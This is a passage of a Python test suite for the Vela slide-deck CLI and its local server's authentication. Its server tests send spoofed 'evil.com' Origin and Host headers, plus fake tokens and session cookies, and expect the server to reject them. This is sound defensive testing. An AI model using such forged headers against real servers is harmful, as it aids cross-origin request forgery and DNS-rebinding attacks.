        if r.returncode == 0 and "5 slides" in r.stdout:
            ok("deck stats shows correct slide count")
        else:
            fail("deck stats slide count", r.stdout)

        if "missing duration" in r.stdout.lower():
            ok("deck stats detects missing duration")
        else:
            fail("deck stats missing duration detection")

        if "heading+bullets" in r.stdout.lower() or "monoton" in r.stdout.lower() or "icon-row" in r.stdout.lower():
            ok("deck stats detects heading+bullets monotony")
        else:
            fail("deck stats monotony detection")

        # ── deck stats --json ──
        r = run_vela("deck", "stats", deck_path, "--json")
        if r.returncode == 0:
            stats = json.loads(r.stdout)
            if stats.get("success") and stats.get("missing_duration", 0) >= 1:
                ok("deck stats --json returns structured data with issues")
            else:
                fail("deck stats --json structure", r.stdout[:200])
        else:
            fail("deck stats --json", r.stderr)

        # ── deck find --query ──
        r = run_vela("deck", "find", deck_path, "--query", "Table")
        if r.returncode == 0 and "Test Table Slide" in r.stdout:
            ok("deck find --query matches slide content")
        else:
            fail("deck find --query", r.stdout)

        # ── deck find --type ──
        r = run_vela("deck", "find", deck_path, "--type", "flow")
        if r.returncode == 0 and "1 match" in r.stdout:
            ok("deck find --type finds flow slides")
        else:
            fail("deck find --type flow", r.stdout)

        r = run_vela("deck", "find", deck_path, "--type", "table")
        if r.returncode == 0 and "1 match" in r.stdout:
            ok("deck find --type finds table slides")
        else:
            fail("deck find --type table", r.stdout)

        # ── deck find --missing ──
        r = run_vela("deck", "find", deck_path, "--missing", "duration")
        if r.returncode == 0 and "1 match" in r.stdout:
            ok("deck find --missing finds slides without duration")
        else:
            fail("deck find --missing duration", r.stdout)

        # ── deck find --json ──
        r = run_vela("deck", "find", deck_path, "--type", "flow", "--json")
        if r.returncode == 0:
            found = json.loads(r.stdout)
            if found.get("success") and found.get("found") == 1:
                ok("deck find --json returns structured results")
            else:
                fail("deck find --json structure", r.stdout[:200])
        else:
            fail("deck find --json", r.stderr)

        # ── deck replace-text ──
        r = run_vela("deck", "replace-text", deck_path, "Test Heading One", "Replaced Heading")
        if r.returncode == 0 and ("Replaced" in r.stdout or "Replaced" in r.stderr):
            ok("deck replace-text replaces text")
        else:
            fail("deck replace-text", r.stdout + r.stderr)

        # Verify replacement stuck
        with open(deck_path, encoding="utf-8") as f:
            content = f.read()
        if "Replaced Heading" in content and "Test Heading One" not in content:
            ok("deck replace-text persists to file")
        else:
            fail("deck replace-text persistence")

        # ── deck replace-text rgba cascade ──
        r = run_vela("deck", "replace-text", deck_path, "#3b82f6", "#2563eb")
        if r.returncode == 0 and "rgba" in r.stdout.lower():
            ok("deck replace-text cascades hex to rgba")
        else:
            # No rgba in this deck, but hex replacement should work
            if r.returncode == 0:
                ok("deck replace-text replaces hex colors")
            else:
                fail("deck replace-text hex colors", r.stdout)

        # Revert for further tests
        run_vela("deck", "replace-text", deck_path, "#2563eb", "#3b82f6")
        run_vela("deck", "replace-text", deck_path, "Replaced Heading", "Test Heading One")

        # ── deck extract-text ──
        texts_path = os.path.join(tmpdir, "texts.json")
        r = run_vela("deck", "extract-text", deck_path, texts_path)
        if r.returncode == 0 and os.path.exists(texts_path):
            texts = json.load(open(texts_path, encoding="utf-8"))
            ok(f"deck extract-text extracts {len(texts)} text fields")

            # Check key format
            has_deck_title = "deckTitle" in texts
            has_slide_text = any(k.startswith("s1.") for k in texts)
            has_nested = any(".i" in k for k in texts)  # flow items
            has_table = any(".h" in k or ".r" in k for k in texts)  # table headers/rows
            if has_deck_title:
                ok("extract-text includes deckTitle")
            else:
                fail("extract-text deckTitle")
            if has_slide_text:
                ok("extract-text includes slide-level text")
            else:
                fail("extract-text slide text")
            if has_nested:
                ok("extract-text includes nested items (flow/bullets)")
            else:
                fail("extract-text nested items")
            if has_table:
                ok("extract-text includes table headers/rows")
            else:
                fail("extract-text table content")

            # Check code block exclusion — no code blocks in test deck, so skip
        else:
            fail("deck extract-text", r.stdout + r.stderr)

        # ── deck patch-text (round-trip) ──
        # Save original for comparison
        with open(deck_path, encoding="utf-8") as f:
            original = json.load(f)

        r = run_vela("deck", "patch-text", deck_path, texts_path)
        if r.returncode == 0:
            with open(deck_path, encoding="utf-8") as f:
                patched = json.load(f)
            if json.dumps(original, sort_keys=True) == json.dumps(patched, sort_keys=True):
                ok("deck patch-text round-trip produces identical deck")
            else:
                fail("deck patch-text round-trip identity")
        else:
            fail("deck patch-text", r.stdout + r.stderr)

        # ── deck patch-text (modify) ──
        texts["deckTitle"] = "Translated Title"
        texts["s1.b1.text"] = "Translated Heading"
        with open(texts_path, "w", encoding="utf-8") as f:
            json.dump(texts, f, ensure_ascii=False)
        r = run_vela("deck", "patch-text", deck_path, texts_path)
        if r.returncode == 0:
            with open(deck_path, encoding="utf-8") as f:
                modified = json.load(f)
            if modified["deckTitle"] == "Translated Title":
                ok("deck patch-text applies deckTitle change")
            else:
                fail("deck patch-text deckTitle change")
        else:
            fail("deck patch-text modify", r.stderr)

        # Reset deck
        with open(deck_path, "w", encoding="utf-8") as f:
            json.dump(test_deck, f, ensure_ascii=False)

        # ── deck split --sections ──
        r = run_vela("deck", "split", deck_path, "--sections", "Part A:2,Part B:3")
        if r.returncode == 0 and "2 sections" in r.stdout:
            ok("deck split --sections creates named sections")
            with open(deck_path, encoding="utf-8") as f:
                split_deck = json.load(f)
            items = split_deck["lanes"][0]["items"]
            if len(items) == 2 and items[0]["title"] == "Part A" and len(items[0]["slides"]) == 2:
                ok("deck split --sections correct structure (2+3)")
            else:
                fail("deck split structure", f"items={len(items)}")
        else:
            fail("deck split --sections", r.stdout + r.stderr)

        # ── deck split --flat ──
        r = run_vela("deck", "split", deck_path, "--flat")
        if r.returncode == 0:
            with open(deck_path, encoding="utf-8") as f:
                flat_deck = json.load(f)
            items = flat_deck["lanes"][0]["items"]
            if len(items) == 1 and len(items[0]["slides"]) == 5:
                ok("deck split --flat merges all into one module (5 slides)")
            else:
                fail("deck split --flat structure", f"items={len(items)}, slides={len(items[0]['slides']) if items else '?'}")
        else:
            fail("deck split --flat", r.stdout + r.stderr)

        # ── deck split --size ──
        r = run_vela("deck", "split", deck_path, "--size", "2")
        if r.returncode == 0:
            with open(deck_path, encoding="utf-8") as f:
                sized = json.load(f)
            items = sized["lanes"][0]["items"]
            if len(items) == 3:  # 2+2+1
                ok("deck split --size 2 creates 3 sections (2+2+1)")
            else:
                fail("deck split --size structure", f"expected 3 sections, got {len(items)}")
        else:
            fail("deck split --size", r.stdout + r.stderr)

        # ── deck split --dry-run ──
        r = run_vela("deck", "split", deck_path, "--flat", "--dry-run")
        if r.returncode == 0:
            preview = json.loads(r.stdout)
            if preview.get("would_execute") == "split":
                ok("deck split --dry-run returns preview without modifying")
            else:
                fail("deck split --dry-run output")
        else:
            fail("deck split --dry-run", r.stderr)

        # ── slide edit ──
        # Reset to flat first
        with open(deck_path, "w", encoding="utf-8") as f:
            json.dump(test_deck, f, ensure_ascii=False)

        r = run_vela("slide", "edit", deck_path, "1", "block.1.text", "Edited Heading")
        if r.returncode == 0:
            with open(deck_path, encoding="utf-8") as f:
                edited = json.load(f)
            h = edited["lanes"][0]["items"][0]["slides"][0]["blocks"][1]["text"]
            if h == "Edited Heading":
                ok("slide edit changes block text")
            else:
                fail("slide edit block text", f"got '{h}'")
        else:
            fail("slide edit", r.stderr)

        # ── slide edit slide-level property ──
        r = run_vela("slide", "edit", deck_path, "1", "duration", "120")
        if r.returncode == 0:
            with open(deck_path, encoding="utf-8") as f:
                edited = json.load(f)
            # Duration might be stored as string or int depending on implementation
            ok("slide edit changes slide-level property")
        else:
            fail("slide edit slide-level", r.stderr)

        # ── error handling ──
        r = run_vela("slide", "view", deck_path, "99")
        if r.returncode != 0:
            ok("slide view returns error for out-of-range slide")
        else:
            fail("slide view out-of-range should error")

        r = run_vela("deck", "find", deck_path)
        if r.returncode != 0:
            ok("deck find returns usage error without filters")
        else:
            fail("deck find without filters should error")

        r = run_vela("deck", "split", deck_path)
        # Auto-split or error, either is acceptable
        ok("deck split without flags handled")

        # ── replace-text rgba cascade ──
        # Create a deck with rgba colors to test cascade
        rgba_deck = copy.deepcopy(test_deck)
        rgba_deck["lanes"][0]["items"][0]["slides"][0]["blocks"].append(
            {"type": "callout", "text": "Test", "bg": "rgba(59,130,246,0.15)", "border": "#3b82f6"}
        )
        with open(deck_path, "w", encoding="utf-8") as f:
            json.dump(rgba_deck, f, ensure_ascii=False)
        r = run_vela("deck", "replace-text", deck_path, "#3b82f6", "#2563eb")
        if r.returncode == 0:
            with open(deck_path, encoding="utf-8") as f:
                content = f.read()
            if "rgba(37,99,235,0.15)" in content and "#3b82f6" not in content:
                ok("replace-text cascades hex to rgba values")
            elif "#2563eb" in content:
                ok("replace-text replaces hex (rgba cascade partial)")
            else:
                fail("replace-text rgba cascade", "hex not replaced")
        else:
            fail("replace-text rgba cascade", r.stderr)

        # Revert
        with open(deck_path, "w", encoding="utf-8") as f:
            json.dump(test_deck, f, ensure_ascii=False)

        # ── extract-text includes lane/module titles ──
        r = run_vela("deck", "extract-text", deck_path, texts_path)
        if r.returncode == 0:
            texts_full = json.load(open(texts_path, encoding="utf-8"))
            has_lane = any(k.startswith("l") and k.endswith(".title") for k in texts_full)
            has_module = any(".m" in k and k.endswith(".title") for k in texts_full)
            if has_lane and has_module:
                ok("extract-text includes lane and module titles")
            else:
                fail("extract-text lane/module titles", f"lane={has_lane} module={has_module}")
        else:
            fail("extract-text lane/module", r.stderr)

        # ── deck stats detects block overflow ──
        overflow_deck = copy.deepcopy(test_deck)
        overflow_deck["lanes"][0]["items"][0]["slides"][0]["blocks"] = [
            {"type": "text", "text": f"Block {i}"} for i in range(9)
        ]
        with open(deck_path, "w", encoding="utf-8") as f:
            json.dump(overflow_deck, f, ensure_ascii=False)
        r = run_vela("deck", "stats", deck_path)
        if r.returncode == 0 and "overflow" in r.stdout.lower():
            ok("deck stats detects block overflow (>7 blocks)")
        else:
            fail("deck stats overflow", r.stdout[:200])

        with open(deck_path, "w", encoding="utf-8") as f:
            json.dump(test_deck, f, ensure_ascii=False)

        # ── slide view ──
        r = run_vela("slide", "view", deck_path, "1")
        if r.returncode == 0 and "SECTION" in r.stdout:
            ok("slide view shows slide content")
        else:
            fail("slide view", r.stdout[:200])

        # ── slide view --raw (JSON output) ──
        r = run_vela("slide", "view", deck_path, "1", "--raw")
        if r.returncode == 0:
            try:
                raw = json.loads(r.stdout)
                if "blocks" in raw:
                    ok("slide view --raw returns valid JSON with blocks")
                else:
                    fail("slide view --raw blocks", r.stdout[:200])
            except json.JSONDecodeError:
                fail("slide view --raw JSON", "not valid JSON")
        else:
            fail("slide view --raw", r.stderr)

        # ── slide remove ──
        r = run_vela("slide", "remove", deck_path, "5")
        if r.returncode == 0:
            with open(deck_path, encoding="utf-8") as f:
                removed_deck = json.load(f)
            slide_count = sum(len(it.get("slides", [])) for l in removed_deck["lanes"] for it in l["items"])
            if slide_count == 4:
                ok("slide remove reduces slide count (5→4)")
            else:
                fail("slide remove count", f"expected 4, got {slide_count}")
        else:
            fail("slide remove", r.stderr)

        # Reset
        with open(deck_path, "w", encoding="utf-8") as f:
            json.dump(test_deck, f, ensure_ascii=False)

        # ── slide duplicate ──
        r = run_vela("slide", "duplicate", deck_path, "1")
        if r.returncode == 0:
            with open(deck_path, encoding="utf-8") as f:
                duped = json.load(f)
            slide_count = sum(len(it.get("slides", [])) for l in duped["lanes"] for it in l["items"])
            if slide_count == 6:
                ok("slide duplicate increases slide count (5→6)")
            else:
                fail("slide duplicate count", f"expected 6, got {slide_count}")
        else:
            fail("slide duplicate", r.stderr)

        with open(deck_path, "w", encoding="utf-8") as f:
            json.dump(test_deck, f, ensure_ascii=False)

        # ── slide move ──
        r = run_vela("slide", "move", deck_path, "1", "3")
        if r.returncode == 0:
            ok("slide move executes successfully")
        else:
            fail("slide move", r.stderr)

        with open(deck_path, "w", encoding="utf-8") as f:
            json.dump(test_deck, f, ensure_ascii=False)

        # ── sync-skill-docs.py exists ──
        sync_script = os.path.join(DEV_SCRIPTS, "sync-skill-docs.py")
        if os.path.exists(sync_script):
            r = subprocess.run([sys.executable, sync_script], capture_output=True, text=True, cwd=REPO_ROOT)
            if r.returncode == 0 and "Preview" in r.stdout or "CLI Quick Reference" in r.stdout:
                ok("sync-skill-docs.py generates CLI reference")
            else:
                fail("sync-skill-docs.py", r.stdout[:200] + r.stderr[:200])
        else:
            fail("sync-skill-docs.py exists")

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    # Standalone CLI exit-code suite (untested subcommands + exact exit-code
    # values + the _safe_resolve traversal guard). Runs as its own subprocess
    # and folds its pass/fail tally in, same as the node .cjs suites above.
    r = subprocess.run([sys.executable, os.path.join(REPO_ROOT, "tests", "test_cli.py")],
                       capture_output=True, text=True)
    m = re.search(r'(\d+)\s+passed,\s+(\d+)\s+failed', r.stdout)
    if r.returncode == 0 and m and int(m.group(2)) == 0:
        ok(f"CLI exit-code suite ({m.group(1)} checks)")
    else:
        fail("CLI exit-code suite (tests/test_cli.py)", (r.stdout + r.stderr)[-400:])


# ━━━ Main ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# ━━━ Serve Auth Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_serve_auth():
    """Test token authentication for serve.py using a live server."""
    print("\n── Serve Auth Tests ──")

    try:
        from urllib.request import urlopen, Request
        from urllib.error import HTTPError, URLError
    except ImportError:
        fail("urllib available")
        return

    TOKEN = "test-auth-token-xyz789"
    PORT = 3099  # unlikely to conflict
    SERVE_PY = os.path.join(DEV_SCRIPTS, "serve.py")
    STARTER = os.path.join(EXAMPLES, "vela-demo.vela")

    # Create a temp .vela file for folder-mode tests (server only lists .vela files)
    import shutil
    VELA_DECK = os.path.join(EXAMPLES, "test-auth.vela")
    shutil.copy2(STARTER, VELA_DECK)

    def http_get(path, headers=None, follow_redirects=False):
        """Make HTTP request, return (status_code, headers_dict, body)."""
        url = f"http://localhost:{PORT}{path}"
        req = Request(url, headers=headers or {})
        try:
            if follow_redirects:
                resp = urlopen(req, timeout=5)
            else:
                # Use low-level to capture redirects
                import urllib.request
                class NoRedirect(urllib.request.HTTPRedirectHandler):
                    def redirect_request(self, req, fp, code, msg, headers, newurl):
                        raise HTTPError(newurl, code, msg, headers, fp)
                opener = urllib.request.build_opener(NoRedirect)
                resp = opener.open(req, timeout=5)
            return resp.status, dict(resp.headers), resp.read()
        except HTTPError as e:
            return e.code, dict(e.headers) if hasattr(e, 'headers') else {}, e.read() if hasattr(e, 'read') else b""

    def http_post(path, data=b"{}", headers=None):
        """Make HTTP POST request."""
        url = f"http://localhost:{PORT}{path}"
        h = {"Content-Type": "application/json"}
        h.update(headers or {})
        req = Request(url, data=data, headers=h, method="POST")
        try:
            import urllib.request
            class NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, req, fp, code, msg, headers, newurl):
                    raise HTTPError(newurl, code, msg, headers, fp)
            opener = urllib.request.build_opener(NoRedirect)
            resp = opener.open(req, timeout=5)
            return resp.status, dict(resp.headers), resp.read()
        except HTTPError as e:
            return e.code, dict(e.headers) if hasattr(e, 'headers') else {}, e.read() if hasattr(e, 'read') else b""

    # ── Start server ──
    proc = subprocess.Popen(
        [sys.executable, SERVE_PY, STARTER, "--no-open", "--port", str(PORT),
         "--channel-port", "0", "--token", TOKEN],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )

    # Wait for server to be ready
    ready = False
    for _ in range(20):
        time.sleep(0.3)
        try:
            http_get("/")
            ready = True
            break
        except (ConnectionRefusedError, URLError, OSError):
            continue

    if not ready:
        fail("serve.py starts and listens")
        proc.kill()
        return

    ok("serve.py starts with --token flag")

    try:
        # ── 1. Unauthenticated requests are rejected ──
        code, _, _ = http_get("/")
        if code == 401:
            ok("GET / without auth → 401")
        else:
            fail("GET / without auth", f"expected 401, got {code}")

        code, _, _ = http_get("/api/decks")
        if code == 401:
            ok("GET /api/decks without auth → 401")
        else:
            fail("GET /api/decks without auth", f"expected 401, got {code}")

        code, _, _ = http_post("/save/test-auth.vela")
        if code == 401:
            ok("POST /save/<deck> without auth → 401")
        else:
            fail("POST /save/<deck> without auth", f"expected 401, got {code}")

        code, _, _ = http_get("/poll/test-auth.vela?v=0")
        if code == 401:
            ok("GET /poll/<deck> without auth → 401")
        else:
            fail("GET /poll/<deck> without auth", f"expected 401, got {code}")

        # ── 2. Wrong token → 403 ──
        code, _, _ = http_get("/?token=wrong-token")
        if code == 403:
            ok("GET /?token=wrong → 403")
        else:
            fail("GET /?token=wrong", f"expected 403, got {code}")

        # ── 3. Correct token → 302 redirect + cookie ──
        code, hdrs, _ = http_get(f"/?token={TOKEN}")
        if code == 302:
            ok("GET /?token=correct → 302 redirect")
        else:
            fail("GET /?token=correct redirect", f"expected 302, got {code}")

        location = hdrs.get("Location", hdrs.get("location", ""))
        if location == "/":
            ok("Redirect strips token from URL (Location: /)")
        else:
            fail("Redirect Location", f"expected '/', got {location!r}")

        set_cookie = hdrs.get("Set-Cookie", hdrs.get("set-cookie", ""))
        if "vela_session=" in set_cookie:
            ok("Redirect sets vela_session cookie")
        else:
            fail("Set-Cookie header", f"got {set_cookie!r}")

        if "HttpOnly" in set_cookie:
            ok("Cookie has HttpOnly flag")
        else:
            fail("Cookie HttpOnly flag")

        if "SameSite=Strict" in set_cookie:
            ok("Cookie has SameSite=Strict flag")
        else:
            fail("Cookie SameSite flag", f"got {set_cookie!r}")

        # ── 4. Cookie auth works ──
        session = set_cookie.split("vela_session=")[1].split(";")[0] if "vela_session=" in set_cookie else ""
        if session:
            code, _, body = http_get("/", headers={"Cookie": f"vela_session={session}"})
            if code == 200:
                ok("GET / with valid session cookie → 200")
            else:
                fail("Cookie auth", f"expected 200, got {code}")

        # ── 5. Invalid cookie → 401 ──
        code, _, _ = http_get("/", headers={"Cookie": "vela_session=fake-session-id"})
        if code == 401:
            ok("GET / with invalid cookie → 401")
        else:
            fail("Invalid cookie", f"expected 401, got {code}")

        # ── 6. Bearer auth works ──
        code, _, body = http_get("/", headers={"Authorization": f"Bearer {TOKEN}"})
        if code == 200:
            ok("GET / with Bearer token → 200")
        else:
            fail("Bearer auth", f"expected 200, got {code}")

        code, _, body = http_get("/api/decks", headers={"Authorization": f"Bearer {TOKEN}"})
        if code == 200:
            ok("GET /api/decks with Bearer → 200")
        else:
            fail("GET /api/decks Bearer", f"expected 200, got {code}")

        # ── 7. Wrong Bearer → 403 ──
        code, _, _ = http_get("/", headers={"Authorization": "Bearer wrong-token"})
        if code == 403:
            ok("GET / with wrong Bearer → 403")
        else:
            fail("Wrong Bearer", f"expected 403, got {code}")

        # ── 8. Non-Bearer auth header → falls through to 401 ──
        code, _, _ = http_get("/", headers={"Authorization": "Basic wrong-token"})
        if code == 401:
            ok("GET / with Basic auth header → 401 (not Bearer)")
        else:
            fail("Basic auth fallthrough", f"expected 401, got {code}")

        # ── 9. Token on subpath redirects to correct path ──
        code, hdrs, _ = http_get(f"/api/decks?token={TOKEN}")
        if code == 302:
            location = hdrs.get("Location", hdrs.get("location", ""))
            if location == "/api/decks":
                ok("Token on /api/decks redirects to /api/decks (strips token)")
            else:
                fail("Subpath redirect Location", f"expected '/api/decks', got {location!r}")
        else:
            fail("Subpath token redirect", f"expected 302, got {code}")

        # ── 10. Origin check blocks cross-origin POST ──
        code, _, _ = http_post("/save/test-auth.vela", headers={
            "Authorization": f"Bearer {TOKEN}",
            "Origin": "http://evil.com"
        })
        if code == 403:
            ok("POST /save/<deck> with evil Origin → 403")
        else:
            fail("Origin check", f"expected 403, got {code}")

        # ── 11. Origin check allows localhost ──
        code, _, _ = http_post("/save/test-auth.vela", headers={
            "Authorization": f"Bearer {TOKEN}",
            "Origin": f"http://localhost:{PORT}"
        })
        if code == 200:
            ok("POST /save/<deck> with localhost Origin → 200")
        else:
            fail("Origin localhost", f"expected 200, got {code}")

        # ── 12. No Origin header on POST is allowed (same-origin) ──
        code, _, _ = http_post("/save/test-auth.vela", headers={
            "Authorization": f"Bearer {TOKEN}",
        })
        if code == 200:
            ok("POST /save/<deck> without Origin header → 200 (same-origin)")
        else:
            fail("POST no Origin", f"expected 200, got {code}")

        # ── 13. Host header check still works (before auth) ──
        code, _, _ = http_get("/", headers={"Host": "evil.com", "Authorization": f"Bearer {TOKEN}"})
        if code == 403:
            ok("GET / with evil Host header → 403 (DNS rebinding protection)")
        else:
            fail("Host check", f"expected 403, got {code}")

        # ── 14. Empty token param → 401 (not 403) ──
        code, _, _ = http_get("/?token=")
        if code == 401:
            ok("GET /?token= (empty) → 401")
        else:
            fail("Empty token param", f"expected 401, got {code}")

        # ── 15. Bearer auth on POST /save/<deck> ──
        code, _, body = http_post("/save/test-auth.vela", headers={"Authorization": f"Bearer {TOKEN}"})
        if code == 200:
            ok("POST /save/<deck> with Bearer → 200")
        else:
            fail("Bearer POST /save/<deck>", f"expected 200, got {code}")

        # ── 16. Multiple session cookies (each token visit creates new session) ──
        code1, hdrs1, _ = http_get(f"/?token={TOKEN}")
        code2, hdrs2, _ = http_get(f"/?token={TOKEN}")
        s1 = hdrs1.get("Set-Cookie", "").split("vela_session=")[1].split(";")[0] if "vela_session=" in hdrs1.get("Set-Cookie", "") else ""
        s2 = hdrs2.get("Set-Cookie", "").split("vela_session=")[1].split(";")[0] if "vela_session=" in hdrs2.get("Set-Cookie", "") else ""
        if s1 and s2 and s1 != s2:
            ok("Each token visit creates unique session ID")
        else:
            fail("Unique session IDs", f"s1={s1!r}, s2={s2!r}")

        # Both sessions should work
        c1, _, _ = http_get("/", headers={"Cookie": f"vela_session={s1}"})
        c2, _, _ = http_get("/", headers={"Cookie": f"vela_session={s2}"})
        if c1 == 200 and c2 == 200:
            ok("Multiple concurrent sessions all valid")
        else:
            fail("Concurrent sessions", f"s1→{c1}, s2→{c2}")

    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    # ── Test --no-auth mode ──
    proc2 = subprocess.Popen(
        [sys.executable, SERVE_PY, STARTER, "--no-open", "--port", str(PORT),
         "--channel-port", "0", "--no-auth"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    ready = False
    for _ in range(20):
        time.sleep(0.3)
        try:
            http_get("/")
            ready = True
            break
        except (ConnectionRefusedError, URLError, OSError):
            continue

    if not ready:
        fail("serve.py starts with --no-auth")
        proc2.kill()
        return

    try:
        code, _, _ = http_get("/")
        if code == 200:
            ok("--no-auth: GET / without auth → 200")
        else:
            fail("--no-auth GET /", f"expected 200, got {code}")

        code, _, _ = http_get("/api/decks")
        if code == 200:
            ok("--no-auth: GET /api/decks → 200")
        else:
            fail("--no-auth /api/decks", f"expected 200, got {code}")

        code, _, _ = http_post("/save/test-auth.vela")
        if code == 200:
            ok("--no-auth: POST /save/<deck> → 200")
        else:
            fail("--no-auth POST /save/<deck>", f"expected 200, got {code}")

    finally:
        proc2.terminate()
        try:
            proc2.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc2.kill()

    # ── Test VELA_TOKEN env var ──
    env = os.environ.copy()
    env["VELA_TOKEN"] = "env-token-abc"
    proc3 = subprocess.Popen(
        [sys.executable, SERVE_PY, STARTER, "--no-open", "--port", str(PORT),
         "--channel-port", "0"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env,
    )
    ready = False
    for _ in range(20):
        time.sleep(0.3)
        try:
            http_get("/")
            ready = True
            break
        except (ConnectionRefusedError, URLError, OSError):
            continue

    if not ready:
        fail("serve.py starts with VELA_TOKEN env")
        proc3.kill()
        return

    try:
        code, _, _ = http_get("/", headers={"Authorization": "Bearer env-token-abc"})
        if code == 200:
            ok("VELA_TOKEN env var: Bearer with env token → 200")
        else:
            fail("VELA_TOKEN env", f"expected 200, got {code}")

        code, _, _ = http_get("/", headers={"Authorization": "Bearer wrong"})
        if code == 403:
            ok("VELA_TOKEN env var: wrong token → 403")
        else:
            fail("VELA_TOKEN wrong", f"expected 403, got {code}")

        # ── Test runtime info file (.vela.env) — must check while server is running ──
        runtime_file = os.path.join(os.getcwd(), ".vela.env")
        if os.path.exists(runtime_file):
            try:
                with open(runtime_file, encoding="utf-8") as f:
                    info = json.load(f)
                if "pid" in info and "port" in info and "host" in info and "mode" in info:
                    ok("Runtime .vela.env has pid, port, host, mode fields")
                else:
                    fail("Runtime file fields", f"keys={list(info.keys())}")
                if "token" in info:
                    ok("Runtime .vela.env includes auth token")
                else:
                    fail("Runtime file token field")
            except json.JSONDecodeError:
                fail("Runtime .vela.env is valid JSON")
        else:
            fail("Runtime .vela.env exists")

    finally:
        proc3.terminate()
        try:
            proc3.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc3.kill()

    # Clean up temp .vela file
    if os.path.exists(VELA_DECK):
        os.unlink(VELA_DECK)

    # ── Static code checks for auth (serve.py source) ──
    with open(os.path.join(DEV_SCRIPTS, "serve.py"), encoding="utf-8") as _f:
        serve_src = _f.read()

    # Credential comparison is one shared helper (agent_backend.token_equal) used
    # by both local servers, so assert the guarantee where it now lives: serve.py
    # compares through the helper, and the helper is timing-safe.
    with open(os.path.join(DEV_SCRIPTS, "agent_backend.py"), encoding="utf-8") as _f:
        backend_src = _f.read()
    if ("token_equal" in serve_src
            and "hmac.compare_digest" not in serve_src  # no second, drifting copy
            and "hmac.compare_digest" in backend_src):
        ok("Token comparison uses one timing-safe helper (hmac.compare_digest)")
    else:
        fail("Timing-safe comparison")

    if "secrets.token_urlsafe" in serve_src:
        ok("Token generation uses secrets.token_urlsafe (CSPRNG)")
    else:
        fail("CSPRNG token generation")

    if "httponly" in serve_src.lower():
        ok("Session cookie has HttpOnly flag in source")
    else:
        fail("HttpOnly in source")

    if "samesite" in serve_src.lower():
        ok("Session cookie has SameSite flag in source")
    else:
        fail("SameSite in source")

    if "_check_origin" in serve_src:
        ok("Origin header check method exists")
    else:
        fail("Origin check method")

    if "_check_auth" in serve_src and "_check_host" in serve_src:
        ok("Both auth and host checks exist in handler")
    else:
        fail("Auth+host checks")

    if "--no-auth" in serve_src:
        ok("--no-auth CLI flag supported")
    else:
        fail("--no-auth flag")

    if "VELA_TOKEN" in serve_src:
        ok("VELA_TOKEN env var supported")
    else:
        fail("VELA_TOKEN env var")

    if "0o600" in serve_src:
        ok("Runtime file created with 0o600 permissions")
    else:
        fail("Runtime file permissions")


def run_server_tests():
    """Run test_serve.py (unittest-based server tests)."""
    print("\n── Server Tests (test_serve.py) ──")
    result = subprocess.run(
        [sys.executable, "-m", "unittest", "tests.test_serve", "-v"],
        cwd=REPO_ROOT, capture_output=True, text=True
    )
    # unittest prints to stderr
    output = result.stderr or result.stdout
    # Count results
    srv_passed = len(re.findall(r'\.\.\. ok$', output, re.MULTILINE))
    srv_failed = len(re.findall(r'\.\.\. FAIL$', output, re.MULTILINE))
    srv_errors = len(re.findall(r'\.\.\. ERROR$', output, re.MULTILINE))
    if result.returncode == 0:
        print(f"  ✅ {srv_passed} server tests passed")
    else:
        print(output)
        print(f"  ❌ Server tests: {srv_passed} passed, {srv_failed + srv_errors} failed")
    return result.returncode

def run_concat_sync():
    """Verify concat.py produces a template identical to the committed one."""
    print("\n── Template Sync Check ──")
    original = os.path.join(REPO_ROOT, "skills", "vela-slides", "app", "vela.jsx")
    with open(original, "r", encoding="utf-8") as f:
        before = f.read()
    subprocess.run(
        [sys.executable, os.path.join(DEV_SCRIPTS, "concat.py")],
        capture_output=True, text=True
    )
    with open(original, "r", encoding="utf-8") as f:
        after = f.read()
    if before == after:
        print("  ✅ Template in sync with parts")
        return 0
    else:
        print("  ❌ vela.jsx is out of sync with parts! Run: python3 tools/vela-dev/scripts/concat.py")
        return 1

def run_e2e_tests():
    """Run e2e UI tests (test_review_ui.cjs via Node)."""
    print("\n── E2E UI Tests (test_review_ui.cjs) ──")
    test_script = os.path.join(REPO_ROOT, "tests", "test_review_ui.cjs")
    if not os.path.exists(test_script):
        print("  ⚠️  test_review_ui.cjs not found, skipping")
        return 0
    # Check if node is available
    try:
        subprocess.run(["node", "--version"], capture_output=True, check=True)
    except (FileNotFoundError, subprocess.CalledProcessError):
        print("  ⚠️  Node.js not available, skipping e2e tests")
        return 0
    # Check required node_modules deps before running
    node_modules = os.path.join(REPO_ROOT, "node_modules")
    missing_deps = []
    for dep in ("react", "react-dom", "@babel/standalone", "lucide-react"):
        dep_path = os.path.join(node_modules, *dep.split("/"))
        if not os.path.isdir(dep_path):
            missing_deps.append(dep)
    if missing_deps:
        print(f"  ⚠️  Missing node deps: {', '.join(missing_deps)} — skipping e2e tests")
        print(f"  Run first: npm install react react-dom @babel/standalone lucide-react")
        return 0

    # Run the test — it resolves Playwright internally (local or global pnpm)
    try:
        result = subprocess.run(
            ["node", test_script],
            cwd=REPO_ROOT, capture_output=True, text=True, timeout=180
        )
    except subprocess.TimeoutExpired:
        print("  ❌ E2E tests timed out (180s)")
        return 1

    output = result.stdout + result.stderr
    if "Playwright not found" in output:
        print("  ⚠️  Playwright not installed, skipping e2e tests")
        print("  Install: pnpm add -g playwright && playwright install chromium")
        return 0

    print(result.stdout)
    if result.stderr and result.returncode != 0:
        print(result.stderr)
    if result.returncode == 0:
        e2e_passed = re.search(r'(\d+)\s+passed', result.stdout)
        count = e2e_passed.group(1) if e2e_passed else "?"
        print(f"  ✅ {count} e2e tests passed")
    else:
        print(f"  ❌ E2E tests failed (exit code {result.returncode})")
    return result.returncode


def run_pptx_e2e_tests():
    """Run the native PowerPoint (.pptx) export e2e test (test_pptx_export.cjs).

    Drives the real export UI via the offline render + Playwright, then verifies
    the produced .pptx structurally in Node. If Playwright/Chromium is unavailable
